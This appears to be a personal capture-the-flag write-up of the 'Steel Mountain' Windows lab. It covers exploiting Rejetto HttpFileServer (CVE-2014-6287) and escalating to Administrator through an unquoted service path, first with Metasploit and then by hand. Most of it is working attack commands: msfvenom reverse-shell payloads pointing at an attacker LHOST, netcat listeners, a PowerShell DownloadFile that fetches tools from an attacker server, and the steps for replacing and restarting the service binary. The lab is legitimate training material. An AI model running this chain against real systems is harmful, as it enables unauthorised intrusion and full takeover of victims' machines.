80 http  
135 RPC  
139/445 smb  
8080/tcp open http syn-ack ttl 125 HttpFileServer httpd 2.3  
3389/tcp open ssl/ms-wbt-server? syn-ack ttl 125  
47001/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 
Doman name: STEELMOUNTAIN
 
Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows  
metasploit search rejetto  
set rhosts, rport to 8080
 
upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1  
^^ for privesc, or use http.server tand powershell to get it onto target:
 
To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
 
"Upload PowerUp.ps1"
 
To execute this using Meterpreter, I will type **load powershell** into meterpreter. Then I will enter powershell by entering **powershell_shell**.  
".\PowerUp.ps1"  
"Invoke-AllChecks"
 
ServiceName : AdvancedSystemCareService9  
Path : **C:\Program Files (x86)\IObit\Advanced** SystemCare\ASCService.exe  
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}  
StartName : LocalSystem  
AbuseFunction : **Write-ServiceBinary** -Name 'AdvancedSystemCareService9' -Path <HijackPath>  
**CanRestart : True**  
Name : **AdvancedSystemCareService9**  
Check : **Unquoted Service Paths**
 
The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! (this is basically PATH injection on windows).
 
Use msfvenom to generate a reverse shell as an Windows executable:  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.29.79 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 
Start msf handler to catch rev shell:  
use multi/handler  
set options  
run -j
 
Upload your binary and replace the legitimate one. Then restart the program to get a shell as root:  
cd C:\Program Files (x86)\IObit\  
upload Advanced.exe  
sc stop AdvancedSystemCareService9  
sc start AdvancedSystemCareService9
 
cd C:\Users\bill\Desktop\  
more user.txt  
cd C:\Users\Administrator\Desktop\  
more root.txt
      

**W/O Metasploit:**  
For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to
 
To begin we shall be using the same CVE-2014-6287. However, this time let's use this [exploit.](https://www.exploit-db.com/exploits/39161)  
*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*
 
To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!  
You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
 
nc -nlvp <port from msfv payload>  
Python -m SimpleHTTPServer 80  
python exploit.py <targetIP> 8080

[![夃 V ](Exported%20image%2020250424161509-0.png)](https://1.bp.blogspot.com/-AzLHIcbNmxc/XqrniArM-dI/AAAAAAAADG8/yNhoDoXQdSIQkoyxtaHw2jlybjkHGCkiwCEwYBhgL/s1600/exploit%2Bdrop%2Binitial%2Bshell.png)   
Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c:
 
powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://<IP>/winPEASx64.exe','C:\Users\bill\Desktop\winpeas.exe')
 
Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

![[i] The permissions are also checked and filtered using icacls [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services AdvancedSystemCareService9 C: \Program Files SystemCare\ASCService.exe ](Exported%20image%2020250424161510-1.png)  

What powershell -c command could we run to manually find out the service name?  
*Format is "powershell -c "command here"*  
powershell -c "Get-Service"
 
Now let's escalate to Administrator with our new found knowledge.  
Generate your payload using msfvenom and pull it to the system using powershell.
 
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP> LPORT=443 -e x86/shikata_ga_nai -f exe -o Advanced.exe
 
Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.  
First we need to stop the service which we can do like so;  
sc stop AdvancedSystemCareService9  
Shortly followed by;  
sc start AdvancedSystemCareService9  
Once this command runs, you will see you gain a shell as Administrator on our listener!
   

LL:  
Exploiting http rejetto  
Using meterpreter to upload files  
running execs in powershell .\file.ps1  
using PowerUp.ps1  
What is Unquoted Path Vulnerability  
powershell commands  
metasploit vs. manual exploitation